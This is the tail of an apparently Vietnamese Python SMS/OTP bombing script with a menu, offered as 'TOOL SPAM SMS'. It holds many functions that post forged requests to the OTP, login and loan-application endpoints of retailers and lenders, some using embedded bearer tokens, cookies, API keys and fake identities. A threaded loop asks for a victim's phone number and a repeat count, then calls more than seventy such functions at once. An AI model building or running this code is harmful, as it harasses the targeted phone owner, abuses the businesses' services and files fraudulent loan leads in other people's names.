        'priority': 'u=0, i',
        'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        '_csrf': '',
        'clientId': '609168b9f8d5275ea1e262d6',
        'redirectUrl': 'https://tiniworld.com',
        'phone': sdt,
    }

    response = requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen', cookies=cookies, headers=headers, data=data)
    print('thành Công') #("OTP SEND : Đã gửi thành công hoặc thất bại  TINIWORLD")



def send_otp_via_BACHHOAXANH(sdt):

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Access-Control-Allow-Origin': '*',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DNT': '1',
        'Origin': 'https://www.bachhoaxanh.com',
        'Referer': 'https://www.bachhoaxanh.com/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'authorization': 'Bearer 48AEFAE5FF6C90A31EBC7BB892756688',
        'deviceid': '1c4323a6-32d4-4ce5-9081-b5a4655ba7e6',
        'platform': 'webnew',
        'referer-url': 'https://www.bachhoaxanh.com/dang-nhap',
        'reversehost': 'http://bhxapi.live',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'xapikey': 'bhx-api-core-2022',
    }

    json_data = {
        'deviceId': '1c4323a6-32d4-4ce5-9081-b5a4655ba7e6',
        'userName': sdt,
        'isOnlySms': 1,
        'ip': '',
    }

    response = requests.post('https://apibhx.tgdd.vn/User/LoginWithPassword', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND send_otp_via_BACHHOAXANH:", response.text)


def send_otp_via_shbfinance(sdt):
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Authorization': 'Bearer',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DNT': '1',
        'Origin': 'https://www.shbfinance.com.vn',
        'Referer': 'https://www.shbfinance.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'customerName': generate_random_name(),
        'mobileNumber': sdt,
        'campaignCode': '',
        'documentIds': 'Cash',
        'year': 1996,
        'provinceName': 'An Giang',
        'districtName': 'Châu Đốc',
        'district': None,
        'document': 'Vay tiền mặt',
        'lendingAmt': 40000000,
        'loanAmt': 40000000,
        'lendingPeriod': 12,
        'dateOfBirth': '01-Jan-1996',
        'partnerName': 'Website',
        'utmSource': 'WEB',
        'utmMedium': 'form',
        'utmCampaign': 'vay-tien-mat',
    }

    response = requests.post('https://customer-app-nred.shbfinance.com.vn/api/web/SubmitLoan', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND send_otp_via_shbfinance:", response.text)

def send_otp_via_mafccomvn(sdt):
    cookies = {
        'pll_language': 'vi',
        'BIGipServerPool_www.mafc.com.vn': '654334730.20480.0000',
        'mafcavraaaaaaaaaaaaaaaa_session_': 'BOHBOMAPPPCOMKFPMBDFGDKHMLOJBNAGGGJLKOHELAEOACOEOOPLCKEMKDFMAPDGIOODBMJAMIMBGNFKCCDAFABCFAAIAMONKAHEOOIKOMIPOGDMKFHNPLJKOOHONLEB',
        'MAFC01f6952f': '018fd3cf680ed5f9ed9f2546edbe4214c6c1d1c24f980b9654ff43d962a4d45ed15fb96ee094bb83a9588a303cba75f8db9042279ac6bca62d751af525b2ef57f146709597d08b14f2fc4d49b046c36fa46b82805b1c7712182214182103581f9f2e641831f6688f99544fe20f2b11df2fc5c814ed',
        'MAFC00000000233': '0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c809d000a5ac08535dd51358f6197f3c8335839ea69aae4e9f16840f082b2a0c607cce8305351e49d64a43551e9c9ea86ec6e19e01d85d7a1d507070a8ba8f6f66efaa19a8b4497bbb9b04ba689334a46a1a9eb7c3b58965523e2fb3a5878e3ba7498457f71c7a4c169987c88f53186e5846a80a1bbc7c75fa811b521de665aa27e95c9915844bc2b6116c415293b95050601fc9e5b3b0bd3449f6d074fb6a454aa30267f82c9d1520fdb3112fa12796766fc3eff654bc9f9829b8f70d713c6a744053d806410b846a2c9f568ca3d773e4d91bec',
        'MAFC_101_DID': '0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c8063800f8d5e8ee925ae9ecf081258c38f27590e9879625c7624c6033304425b50ad0443a41fabf9652f15fc34d093f802fe31082aa893b4c121ec9',
        'MAFCed66693a184': '0850209877ab2000035bb49d85d36c1714180eb222a6a5c6b20c2e3328516f0da52a6fabdd5acf9e081c5884c8113000a63479a1b533672c96c6790276b673af3e57c251be970cc54abb2a88d001192bb815cb83ac72e7084a193babac4e2f33',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        # 'cookie': 'pll_language=vi; BIGipServerPool_www.mafc.com.vn=654334730.20480.0000; mafcavraaaaaaaaaaaaaaaa_session_=BOHBOMAPPPCOMKFPMBDFGDKHMLOJBNAGGGJLKOHELAEOACOEOOPLCKEMKDFMAPDGIOODBMJAMIMBGNFKCCDAFABCFAAIAMONKAHEOOIKOMIPOGDMKFHNPLJKOOHONLEB; MAFC01f6952f=018fd3cf680ed5f9ed9f2546edbe4214c6c1d1c24f980b9654ff43d962a4d45ed15fb96ee094bb83a9588a303cba75f8db9042279ac6bca62d751af525b2ef57f146709597d08b14f2fc4d49b046c36fa46b82805b1c7712182214182103581f9f2e641831f6688f99544fe20f2b11df2fc5c814ed; MAFC00000000233=0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c809d000a5ac08535dd51358f6197f3c8335839ea69aae4e9f16840f082b2a0c607cce8305351e49d64a43551e9c9ea86ec6e19e01d85d7a1d507070a8ba8f6f66efaa19a8b4497bbb9b04ba689334a46a1a9eb7c3b58965523e2fb3a5878e3ba7498457f71c7a4c169987c88f53186e5846a80a1bbc7c75fa811b521de665aa27e95c9915844bc2b6116c415293b95050601fc9e5b3b0bd3449f6d074fb6a454aa30267f82c9d1520fdb3112fa12796766fc3eff654bc9f9829b8f70d713c6a744053d806410b846a2c9f568ca3d773e4d91bec; MAFC_101_DID=0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c8063800f8d5e8ee925ae9ecf081258c38f27590e9879625c7624c6033304425b50ad0443a41fabf9652f15fc34d093f802fe31082aa893b4c121ec9; MAFCed66693a184=0850209877ab2000035bb49d85d36c1714180eb222a6a5c6b20c2e3328516f0da52a6fabdd5acf9e081c5884c8113000a63479a1b533672c96c6790276b673af3e57c251be970cc54abb2a88d001192bb815cb83ac72e7084a193babac4e2f33',
        'dnt': '1',
        'origin': 'https://mafc.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://mafc.com.vn/vay-tien-nhanh',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/127.0.0.0',
    }

    json_data = {
        'usersName': 'tannguyen',
        'password': 'mafc123!',
        'income': 0,
        'currAddress': 'Tp.Hcm',
        'phoneNbr': sdt,
        'nationalId': '034201009872',
        'typeCreate': 'API',
        'name': generate_random_name(),
        'allowQualified': 'Y',
        'email': 'b45b93f099',
        'referralCode': '',
        'age': '1992',
        'vendorCode': 'INTERNAL_MKT',
        'msgName': 'creatlead',
        'priAddress': 'null',
        'campaign': 'null',
        'adsGroupName': 'null',
        'adsName': 'null',
        'paramInfo': '',
        'mktCode': 'null',
        'consentNd13': 'Y',
    }

    response = requests.post(
        'https://mafc.com.vn/wp-content/themes/vixus/vaytiennhanhnew/api.php',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )



def send_otp_via_phuclong(sdt):

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://order.phuclong.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://order.phuclong.com.vn/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/127.0.0.0',
        'x-api-key': 'bca14340890a65e5adb04b6fd00a75f264cf5f57e693641f9100aefc642461d3',
    }

    # Dữ liệu JSON cho yêu cầu đầu tiên
    json_data_check = {
        'userName': sdt,
    }

    # Dữ liệu JSON cho yêu cầu thứ hai
    json_data_register = {
        'phoneNumber': sdt,
        'fullName': generate_random_name(),
        'email': 'th456do1g110@hotmail.com',
        'password': 'Nqnt7%@hf3',
    }

    # Gửi yêu cầu đầu tiên
    response_check = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/check', headers=headers, json=json_data_check)
    print('thành Công') #(response_check.json())

    # Gửi yêu cầu thứ hai
    response_register = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, json=json_data_register)
    print('thành Công') #(response_register.json())














##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################

##################################################################################################################################################################################

def send_otp_via_takomo(sdt):

    cookies = {
        '__sbref': 'mkmvwcnohbkannbumnilmdikhgdagdlaumjfsexo',
        '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM5NTI3MTQwMg._Opxk3aYQEWoonHoIgUhbhOxUx_9BtdySPUqwzWA9C0',
    }

    # Cấu hình headers chung
    headers_get = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'dnt': '1',
        'if-none-match': '"849a8-lcHURUguRbzDBoYBR3u76kp0LTU"',
        'priority': 'u=0, i',
        'referer': 'https://takomo.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    headers_post = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://lk.takomo.vn',
        'priority': 'u=1, i',
        'referer': 'https://lk.takomo.vn/?phone={sdt}&amount=2000000&term=7&utm_source=pop_up&utm_medium=organic&utm_campaign=direct_takomo&utm_content=mainpage_popup_login',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    # Thực hiện request GET
    params = {
        'phone': sdt,
        'amount': '2000000',
        'term': '7',
        'utm_source': 'pop_up',
        'utm_medium': 'organic',
        'utm_campaign': 'direct_takomo',
        'utm_content': 'mainpage_popup_login',
    }

    response_get = requests.get('https://lk.takomo.vn/', params=params, cookies=cookies, headers=headers_get)

    print('thành Công') #("OTP SEND :oke")

    # Thực hiện request POST
    json_data = {
        'data': {
            'phone': sdt,
            'code': 'resend',
            'channel': 'ivr',
        },
    }

    response_post = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers_post, json=json_data)

    print('thành Công') #("OTP SEND :", response_post.text)
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################

##################################################################################################################################################################################











import sys
import time
import threading

def send_otp_with_delay(func, phone, delay):
    func(phone)
    time.sleep(delay)

# Lấy số điện thoại và độ trễ từ dòng lệnh
phone = input("Nhập sdt để LNX spam: ")
delay = float(5)
repeat_count = int(input("Nhập số lần spam: "))
 # Số lần gửi OTP

# Tạo danh sách các hàm OTP
otp_functions = [
    send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
    send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha, send_otp_via_fptdk,
    send_otp_via_fptmk, send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
    send_otp_via_DONGCRE, send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
    send_otp_via_WinMart, send_otp_via_vietloan, send_otp_via_lozi, send_otp_via_F88,
    send_otp_via_spacet, send_otp_via_vinpearl, send_otp_via_traveloka, send_otp_via_dongplus,
    send_otp_via_longchau, send_otp_via_longchau1, send_otp_via_galaxyplay, send_otp_via_emartmall,
    send_otp_via_ahamove, send_otp_via_ViettelMoney, send_otp_via_xanhsmsms, send_otp_via_xanhsmzalo,
    send_otp_via_popeyes, send_otp_via_ACHECKIN, send_otp_via_APPOTA, send_otp_via_Watsons,
    send_otp_via_hoangphuc, send_otp_via_fmcomvn, send_otp_via_Reebokvn, send_otp_via_thefaceshop,
    send_otp_via_BEAUTYBOX, send_otp_via_winmart, send_otp_via_medicare, send_otp_via_futabus,
    send_otp_via_ViettelPost, send_otp_via_myviettel2, send_otp_via_myviettel3, send_otp_via_TOKYOLIFE,
    send_otp_via_30shine, send_otp_via_Cathaylife, send_otp_via_vinamilk,
    send_otp_via_vietloan2, send_otp_via_batdongsan, send_otp_via_GUMAC, send_otp_via_mutosi,
    send_otp_via_mutosi1, send_otp_via_vietair, send_otp_via_FAHASA, send_otp_via_hopiness,
    send_otp_via_modcha35, send_otp_via_Bibabo, send_otp_via_MOCA, send_otp_via_pantio,
    send_otp_via_Routine, send_otp_via_vayvnd, send_otp_via_tima, send_otp_via_moneygo,
    send_otp_via_takomo, send_otp_via_paynet, send_otp_via_pico, send_otp_via_PNJ, send_otp_via_TINIWORLD,
    send_otp_via_BACHHOAXANH, send_otp_via_takomo, send_otp_via_mafccomvn, send_otp_via_phuclong
]

# Thực hiện gửi OTP nhiều lần
for _ in range(repeat_count):
    threads = []
    for func in otp_functions:
        thread = threading.Thread(target=send_otp_with_delay, args=(func, phone, delay))
        threads.append(thread)

    # Bắt đầu các luồng
    for thread in threads:
        thread.start()

    # Chờ các luồng hoàn thành
    for thread in threads:
        thread.join()


def send_otp_with_delay(func, phone):
    try:
        func(phone)
        print(f"Spam thành công với {func.__name__}")
    except Exception as e:
        print(f"Lỗi tại {func.__name__}: {e}")
        traceback.print_exc()
    time.sleep(random.uniform(1, 2))

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("⚠️ Thiếu số điện thoại.")
        sys.exit(1)

    phone = sys.argv[1]
    repeat_count = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    delay = 0.2  # giãn cách gửi

    from spam_list import otp_functions  # nếu bạn định nghĩa ở chỗ khác

    for i in range(repeat_count):
        print(f"📨 Vòng spam {i+1}")
        for func in otp_functions:
            send_otp_with_delay(func, phone)


# https://www.sapo.vn
# https://viettel.vn x3
# https://medicare.vn
# https://tv360.vn
# https://www.dienmayxanh.com
# https://kingfoodmart.com/
# https://video.mocha.com.vn
# https://fptplay.vn x2 1 cái quên pass 1 cái tạo acc
# https://vieon.vn/
# https://sso.ghn.vn/register
# https://www.lottemart.vn/
# https://vayvnd.vn/
# https://shopee.vn/
# https://www.thegioididong.com
# https://fptshop.com.vn
# https://winmart.vn/
# https://vietloan.vn
# https://lozi.vn
# https://f88.vn
# https://lozi.vn/
# https://spacet.vn/
# https://booking.vinpearl.com/
# https://www.traveloka.com
# https://dongplus.vn
# https://nhathuoclongchau.com.vn
# https://galaxyplay.vn/
# https://emartmall.com.vn/
# https://app.ahamove.com
# viettelpay.vn # lấy api qua app
# https://www.taxixanhsm.vn # lấy api qua app x2 do cả zalo và sms
# https://id.acheckin.vn/ #1
# https://appota.com/
# get ở app Watsons VN
# https://hoang-phuc.com/
# fm.com.vn
# https://reebok.com.vn/
# https://thefaceshop.com.vn/
# https://beautybox.com.vn/
# https://winmart.vn/
# https://medicare.vn/login#
# https://futabus.vn/dang-nhap
# https://viettelpost.com.vn/
# https://tokyolife.vn/#
# https://30shine.com/
# https://www.cathaylife.com.vn
# https://dominos.vn
# https://new.vinamilk.com.vn
# send_otp_via_vietloan2 # vietloan.vn
# https://batdongsan.com.vn
# https://gumac.vn
# https://mutosi.com/
# https://vietair.com.vn/
# https://www.fahasa.com/
# https://shopiness.vn/
# mocha35 get ở app
# bibabo.vn get app
# moca.vn
# pantio.vn
# https://routine.vn/
# https://vayvnd.vn/
# https://moneygo.vn/
# https://pico.vn
# https://www.pnj.com.vn/
# https://prod-tini-id.nkidworks.com/auth/tinizen

# === END TOOL 2 ===
"""

# ===== Menu =====
def main_menu():
    BOLD_ITALIC = "\033[1;3m"
    RESET = "\033[0m"

    while True:
        clear(); banner()
        print(f"{CYAN}✦══════════════════════════════✦{RESET}")
        print(f"{GREEN}{BOLD_ITALIC} [1] ⚔️  TOOL WAR MESS{RESET}")
        print(f"{YELLOW}{BOLD_ITALIC} [2] 📱  TOOL SPAM SMS{RESET}")
        print(f"{RED}{BOLD_ITALIC} [0] ❌  Thoát{RESET}")
        print(f"{CYAN}✦══════════════════════════════✦{RESET}")
        
        choice = input(f"\n👉 {BOLD_ITALIC}Chọn:{RESET} ").strip()

        if choice == "1":
            clear(); banner()
            print(f"{YELLOW}{BOLD_ITALIC}[⚔️ TOOL WAR] Đang chạy...{RESET}\n")
            try:
                exec(TOOL26_CODE, globals())
            except Exception as e:
                print(f"{RED}[Lỗi TOOL 1]{RESET} {e}")
            pause()
        elif choice == "2":
            clear(); banner()
            print(f"{YELLOW}{BOLD_ITALIC}[📱 TOOL SPAM] Đang chạy...{RESET}\n")
            try:
                exec(TOOL35_CODE, globals())
            except Exception as e:
                print(f"{RED}[Lỗi TOOL 2]{RESET} {e}")
            pause()
        elif choice == "0":
            print(f"{GREEN}👋 {BOLD_ITALIC}Tạm biệt!{RESET}")
            time.sleep(0.6)
            break
        else:
            print(f"{RED}⚠️  {BOLD_ITALIC}Lựa chọn không hợp lệ!{RESET}")
            time.sleep(0.8)


if __name__ == "__main__":
    if True:
        main_menu()